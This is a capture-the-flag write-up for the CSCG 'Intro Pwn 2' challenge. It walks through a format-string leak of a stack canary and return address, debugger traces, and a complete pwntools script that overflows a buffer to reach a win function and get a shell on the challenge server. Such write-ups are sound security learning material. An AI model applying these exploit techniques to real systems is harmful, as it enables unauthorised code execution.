# Intro Pwn 2
This challenge is very similar to the first pwn challenge in the CSCG. It
only adds the following 2 functions. (Again, we are given the binary and
its source)

```c
size_t read_input(int fd, char *buf, size_t size) {
  size_t i;
  for (i = 0; i < size-1; ++i) {
    char c;
    if (read(fd, &c, 1) <= 0) {
      _exit(0);
    }
    if (c == '\n') {
      break;
    }
    buf[i] = c;
  }
  buf[i] = '\0';
  return i;
}
```

```c
void check_password_stage1() {
    char read_buf[0xff];
    printf("Enter the password of stage 1:\n");
    memset(read_buf, 0, sizeof(read_buf));
    read_input(0, read_buf, sizeof(read_buf));
    if(strcmp(read_buf, PASSWORD) != 0) {
        printf("-10 Points for Ravenclaw!\n");
        _exit(0);
    } else {
        printf("+10 Points for Ravenclaw!\n");
    }
}
```

`check_password_stage1` is called before every other function in the main method.
It is a simple function, that checks whether or not we have already completed the
first challenge by letting us input the flag of the first challenge and comparing
it against a constant. This seams secure, because it uses a custom function to
read in the input instead of the exploitable function `gets`.

But we have the flag of the last challenge, so we do not need to exploit anything
here. This is a bit weird, because this means we don't need to do any other work.

So I ran the script from the last challenge on the current....
```
[+] Starting local process './pwn2': pid 8611
[*] Switching to interactive mode
~ Protego!
*** stack smashing detected ***: terminated
[*] Got EOF while reading in interactive
```
... but we don't get a shell because of `*** stack smashing detected ***:
terminated` this is a standard approach to fixing buffer overflow bugs. It works
by writing a random value onto the stack and if a function wants to return, it
compares the value on the stack to the original. If we would have overflown the
buffer, the value on the stack (the so called stack cookie) would be overwritten,
the comparison fails and the function displays  `*** stack smashing detected ***:
terminated` and terminates without returning.
To get around this we have to somehow leak the stack cookie and write it to the
right location. We are already leaking values to get the location of the
`WINgardium_leviosa` function so we can search in these values for the cookie.

```python
from pwn import *

p = process("./pwn2")


p.readline()
p.sendline("CSCG{THIS_IS_TEST_FLAG}") # Format string exploit
p.readline()

p.sendline("|".join(["%p"]*70)) # Format string exploit

p.readline() # reading the Hufflepuff banner
p.readline()
p.readline()
p.readline()

leaks = p.readline().decode("utf-8").split("|") # read the leaked values

print(leaks)

leak_addr = int(leaks[38],16) # get the leaked return address

ret = leak_addr - 0x2e # calculate the address of an ret instruction

win = leak_addr - 0x135 # calculate the address of WINgardium_leviosa

input()

p.sendline(b"Expelliarmus\0" + b"A" * cyclic_find(b"cnaa") + p64(ret) + p64(win))

p.interactive()
```


I set a breakpoint at the xor instruction, that compares the stored and the
intended cookie to get the real cookie
```
Breakpoint 1, 0x000055b68bb82d64 in AAAAAAAA ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────
 RAX  0x2d4d84e5d9bedcd2
 RBX  0x55b68bb82de0 (__libc_csu_init) ◂— push   r15
 RCX  0x7fd41d6e7567 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7fd41d7b9320 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x7fd41d7b7583 (_IO_2_1_stdout_+131) ◂— 0x7b9320000000000a /* '\n' */
 R8   0xb
 R9   0x0
 R10  0x7fd41d782357 ◂— 0x667600296c696e28 /* '(nil)' */
 R11  0x246
 R12  0x55b68bb82930 (_start) ◂— xor    ebp, ebp
 R13  0x7fffd6dfe3a0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffd6dfe290 ◂— 0x9219e82fe45878cb
 RSP  0x7fffd6dfe180 ◂— 'Expelliarmus'
 RIP  0x55b68bb82d64 (AAAAAAAA+101) ◂— xor    rax, qword ptr fs:[0x28]
─────────────────────────────────────────[ DISASM ]──────────────────────────────────────────
 ► 0x55b68bb82d64 <AAAAAAAA+101>    xor    rax, qword ptr fs:[0x28]
   0x55b68bb82d6d <AAAAAAAA+110>    je     AAAAAAAA+141 <0x55b68bb82d8c>
    ↓
   0x55b68bb82d8c <AAAAAAAA+141>    leave  
   0x55b68bb82d8d <AAAAAAAA+142>    ret    

```

Before the xor we got rax = `0x2d4d84e5d9bedcd2`, afterwards we got rax = `0x1d2`
So the correct cookie is:
```
>>> hex(0x2d4d84e5d9bedcd2 ^  0x1d2)
'0x2d4d84e5d9bedd00'
```

We can now search our dumped values for the cookie. It is the 39th leak, this was
the leaked return value from last time, so we have to adjust the code of our
script to account for that. The address we leaked last time is now the 41th leak,
so we also need to change that. We also have to alter the offsets for the ret and
the win addresses.

```python
...
leaks = p.readline().decode("utf-8").split("|") # read the leaked values

print(leaks)

cookie =    int(leaks[38],16) # get the stack cookie
leak_addr = int(leaks[40],16) # get the leaked return address

ret = leak_addr - 0x38 # calculate the address of an ret instruction

win = leak_addr - 0x231 # calculate the address of WINgardium_leviosa

...
```
The only question now is where to put in the cookie. But we can figure that out, by simply using the cyclic function of pwntools.

```python
...
win = leak_addr - 0x231 # calculate the address of WINgardium_leviosa

input()

p.sendline(b"Expelliarmus\0" + cyclic(400))

p.interactive()
...
```


```
Breakpoint 1, 0x000055c130413d64 in AAAAAAAA ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────
 RAX  0x61616f6361616e63 ('cnaacoaa')
 RBX  0x55c130413de0 (__libc_csu_init) ◂— push   r15
 RCX  0x7f54053e5567 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7f54054b7320 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x7f54054b5583 (_IO_2_1_stdout_+131) ◂— 0x4b7320000000000a /* '\n' */
 R8   0xb
 R9   0x0
 R10  0x7f5405480357 ◂— 0x667600296c696e28 /* '(nil)' */
 R11  0x246
 R12  0x55c130413930 (_start) ◂— xor    ebp, ebp
 R13  0x7ffe9621c6f0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffe9621c5e0 ◂— 'cpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad'
 RSP  0x7ffe9621c4d0 ◂— 'Expelliarmus'
 RIP  0x55c130413d64 (AAAAAAAA+101) ◂— xor    rax, qword ptr fs:[0x28]
─────────────────────────────────────────[ DISASM ]──────────────────────────────────────────
 ► 0x55c130413d64 <AAAAAAAA+101>    xor    rax, qword ptr fs:[0x28]
   0x55c130413d6d <AAAAAAAA+110>    je     AAAAAAAA+141 <0x55c130413d8c>
    ↓
   0x55c130413d8c <AAAAAAAA+141>    leave  
   0x55c130413d8d <AAAAAAAA+142>    ret    
```
We overwrote the cookie with `0x61616f6361616e63` (`cnaa`) so we can adjust the
script to place the cookie, the address of the return instruction and the address
of win there.

```python
...
win = leak_addr - 0x231 # calculate the address of WINgardium_leviosa

input()

p.sendline(b"Expelliarmus\0" + b"A" * cyclic_find(b"cnaa") + p64(cookie) +
           p64(ret) + p64(win))

p.interactive()
...
```

But this works only locally again. Which is again a sign for a not aligned stack
and after adding a new ret to the chain, it can also exploit the server.


```
[+] Opening connection to hax1.allesctf.net on port 9101: Done
[*] Switching to interactive mode
~ Protego!
┌───────────────────────┐
│ You are a Slytherin.. │
└───────────────────────┘
$ cat flag
CSCG{NOW_GET_VOLDEMORT}
```
```python
from pwn import *

p = remote("hax1.allesctf.net",9101)


p.readline()
p.sendline("CSCG{NOW_PRACTICE_MORE}") # Format string exploit
p.readline()

p.sendline("|".join(["%p"]*70)) # Format string exploit

p.readline() # reading the Hufflepuff banner
p.readline()
p.readline()
p.readline()

leaks = p.readline().decode("utf-8").split("|") # read the leaked values

cookie =    int(leaks[38],16) # get the stack cookie
leak_addr = int(leaks[40],16) # get the leaked return address

ret = leak_addr - 0x38 # calculate the address of an ret instruction

win = leak_addr - 0x231 # calculate the address of WINgardium_leviosa


p.sendline(b"Expelliarmus\0" + b"A" * cyclic_find(b"cnaa") + p64(cookie) +
        p64(ret) + p64(ret) + p64(win))

p.interactive()
```
